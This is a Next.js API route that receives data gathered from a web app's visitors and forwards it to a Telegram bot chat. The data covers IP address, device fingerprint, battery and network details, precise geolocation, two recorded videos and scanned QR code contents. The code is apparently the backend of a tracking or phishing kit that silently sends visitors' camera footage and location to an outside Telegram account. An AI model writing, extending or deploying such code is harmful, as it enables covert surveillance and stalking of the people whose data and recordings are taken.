import { NextRequest, NextResponse } from "next/server";

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

export async function POST(req: NextRequest) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.error("Telegram bot token or chat ID is not set in environment variables.");
    return NextResponse.json(
      { error: "Telegram bot token or chat ID is not configured." },
      { status: 500 }
    );
  }

  try {
    const {
      clientInfo,
      networkInfo,
      deviceMemory,
      batteryInfo,
      geolocation,
      video1,
      video2,
      qrCodeData,
      permissionStatus,
      ipAddress,
    } = await req.json();

    const messages: Promise<Response>[] = [];

    // --- Construct Summary Message ---
    let summaryText = "Received data from web app:";
    summaryText += `\n\n--- Client & Device Info ---`;
    summaryText += `\nIP Address: ${ipAddress || "Unavailable"}`;
    summaryText += `\nUser Agent: ${clientInfo?.userAgent || "Unavailable"}`;
    summaryText += `\nPlatform: ${clientInfo?.platform || "Unavailable"}`;
    summaryText += `\nCPU Cores: ${clientInfo?.hardwareConcurrency || "Unavailable"}`;
    summaryText += `\nDevice Memory: ${deviceMemory ? `${deviceMemory} GB` : "Unavailable"}`;
    summaryText += `\nBattery Level: ${batteryInfo?.level !== undefined ? `${(batteryInfo.level * 100).toFixed(0)}%` : "Unavailable"}`;
    summaryText += `\nBattery Charging: ${batteryInfo?.charging !== undefined ? (batteryInfo.charging ? "Yes" : "No") : "Unavailable"}`;

    summaryText += `\n\n--- Network Info ---`;
    summaryText += `\nConnection Type: ${networkInfo?.effectiveType || "Unavailable"}`;
    summaryText += `\nRTT: ${networkInfo?.rtt !== undefined ? `${networkInfo.rtt} ms` : "Unavailable"}`;
    summaryText += `\nDownlink: ${networkInfo?.downlink !== undefined ? `${networkInfo.downlink} Mbps` : "Unavailable"}`;

    summaryText += `\n\n--- Permissions & Data ---`;
    summaryText += `\nGeolocation: ${geolocation ? `Lat ${geolocation.latitude}, Lng ${geolocation.longitude}` : "Denied or Unavailable"}`;
    summaryText += `\nVideo 1 Recorded: ${video1 ? "Yes" : "No"}`;
    summaryText += `\nVideo 2 Recorded: ${video2 ? "Yes" : "No"}`;
    summaryText += `\nQR Code Scanned: ${qrCodeData || "No"}`;
    
    if (permissionStatus) {
      summaryText += `\n\n--- Permission Status ---`;
      for (const [key, value] of Object.entries(permissionStatus)) {
        summaryText += `\n${key}: ${value}`;
      }
    }

    messages.push(
      fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: summaryText,
        }),
      }).then(async res => {
        console.log("Summary message API response status:", res.status);
        if (!res.ok) {
            const errorBody = await res.text();
            console.error("Summary message API error response:", errorBody);
        }
        return res;
      })
    );

    // Send Geolocation
    if (geolocation?.latitude && geolocation?.longitude) {
      console.log("Attempting to send location...");
      messages.push(
        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendLocation`, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            latitude: geolocation.latitude,
            longitude: geolocation.longitude,
          }),
        }).then(async res => {
          console.log("Location API response status:", res.status);
          if (!res.ok) {
            const errorBody = await res.text();
            console.error("Location API error response:", errorBody);
          }
          return res;
        })
      );
    }

    // Send Video 1
    if (video1) {
      console.log("Attempting to send Video 1...");
      const base64Data = video1.replace(/^data:video\/\w+;base64,/, "");
      const buffer = Buffer.from(base64Data, "base64");
      const formData = new FormData();
      formData.append("chat_id", TELEGRAM_CHAT_ID);
      formData.append("video", new Blob([buffer], { type: "video/webm" }), "recorded_video_1.webm");

      messages.push(
        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, {
          method: "POST",
          body: formData,
        }).then(async res => {
          console.log("Video 1 API response status:", res.status);
          if (!res.ok) {
            const errorBody = await res.text();
            console.error("Video 1 API error response:", errorBody);
          }
          return res;
        })
      );
    }

    // Send Video 2
    if (video2) {
      console.log("Attempting to send Video 2...");
      const base64Data = video2.replace(/^data:video\/\w+;base64,/, "");
      const buffer = Buffer.from(base64Data, "base64");
      const formData = new FormData();
      formData.append("chat_id", TELEGRAM_CHAT_ID);
      formData.append("video", new Blob([buffer], { type: "video/webm" }), "recorded_video_2.webm");

      messages.push(
        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, {
          method: "POST",
          body: formData,
        }).then(async res => {
          console.log("Video 2 API response status:", res.status);
          if (!res.ok) {
            const errorBody = await res.text();
            console.error("Video 2 API error response:", errorBody);
          }
          return res;
        })
      );
    }

    // Send QR Code Data
    if (qrCodeData) {
      console.log("Attempting to send QR Code data...");
      messages.push(
        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: `QR Code Scanned: ${qrCodeData}`,
          }),
        }).then(async res => {
          console.log("QR Code message API response status:", res.status);
          if (!res.ok) {
            const errorBody = await res.text();
            console.error("QR Code message API error response:", errorBody);
          }
          return res;
        })
      );
    }

    await Promise.allSettled(messages);

    return NextResponse.json({ message: "Data processed and sent to Telegram." });
  } catch (error: any) {
    console.error("Error processing Telegram request:", error);
    return NextResponse.json({ error: error.message || "Internal server error" }, { status: 500 });
  }
}